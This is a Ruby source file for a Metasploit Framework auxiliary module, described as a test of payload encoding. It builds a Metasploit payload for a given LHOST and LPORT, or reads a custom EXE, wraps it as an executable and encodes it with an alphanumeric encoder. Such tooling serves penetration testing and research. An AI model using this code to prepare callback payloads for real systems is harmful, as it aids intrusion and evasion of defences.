##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

    include Msf::Auxiliary::Report
    include Msf::Exploit::EXE

    def initialize
        super(
            'Name'        => 'Test Encoding Within AUX module',
            'Version'     => '$Revision$',
            'Description' => %q{
                This module is a test to confirm if encoding is possible within an AUX module.
            },
            'Author'      => 'Chris John Riley',
            'License'     => MSF_LICENSE,
            'References'  =>
                [
                    # general
                    ['URL', 'http://blog.c22.cc']
                ]
        )

        register_options([
            OptString.new('CUSTOM',      [false, 'Custom EXE to encode']),
            OptString.new('PAYLOAD',        [false, 'Metasploit payload name to encode']),
            OptString.new('EncoderToUse',      [true, 'Metasploit encoder name', 'x86/alpha_mixed']),
            OptAddress.new('LHOST',     [false, 'Set Local Host for PAYLOAD', nil]),
            OptPort.new('LPORT',     [false, 'Set Local Port for PAYLOAD', '4445']),
        ], self.class)

        deregister_options('SNAPLEN')
    end

    def run
        @EncoderName = datastore['EncoderToUse']
        if datastore['PAYLOAD'] and datastore['CUSTOM']
            print_error("Please only select one payload (PAYLOAD or CUSTOM)")
            return
        elsif datastore['PAYLOAD']
            @PAYLOAD = datastore['PAYLOAD']
            @LPORT = datastore['LPORT'] || 4445
            @LHOST = datastore['LHOST']
            if @LHOST.nil?
                print_error("LHOST must be set when specifying a Metasploit payload for delivery!")
                return
            else
                create_payload
            end
        else
            @PAYLOAD = datastore['CUSTOM']
            if ::File.file?(@PAYLOAD) and ::File.readable?(@PAYLOAD)
                read_from_file
            else
                raise "Unable to read from #{@PAYLOAD}"
                return
            end
        end

        stub = '\x41\x41\x41\x41' # todo
        @payload_contents = stub + @payload_contents
        get_encoded_payload
        print_debug("Payload creation complete... see debug output below")
        print_debug(@enc_payload)
    end

    def read_from_file
        print_status("Reading custom EXE from #{@PAYLOAD}")
        file = File.open(@PAYLOAD, "rb")
        @payload_contents = file.read
        return
    end

def create_payload
    print_status("Creating Payload=#{@PAYLOAD} LHOST=#{@LHOST} LPORT=#{@LPORT}")
    mod = framework.payloads.create(@PAYLOAD)
    if (not mod)
        raise "Failed to create payload, #{@PAYLOAD}"
    end
    buffer = mod.generate_simple(
        'Encoder'   => 'generic/none', # no encoder at this point
        'Format'    => 'raw',
        'Options'   => { "LHOST"=>@LHOST, "LPORT"=>@LPORT }
        )
    @payload_contents = generate_payload_exe({
            :code => buffer,
            :arch => mod.arch,
            :platform => mod.platform
    })
    return
end

    def get_encoded_payload

        print_status("Starting encoding process...")

        # Encode with chosen encoder
        enc = framework.encoders.create(@EncoderName)
        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDI' })

        # NOTE: we already eliminated badchars
        plat = Msf::Module::PlatformList.transform('win')
        @enc_payload = enc.encode(@payload_contents, nil, nil, plat)
        return
    end
end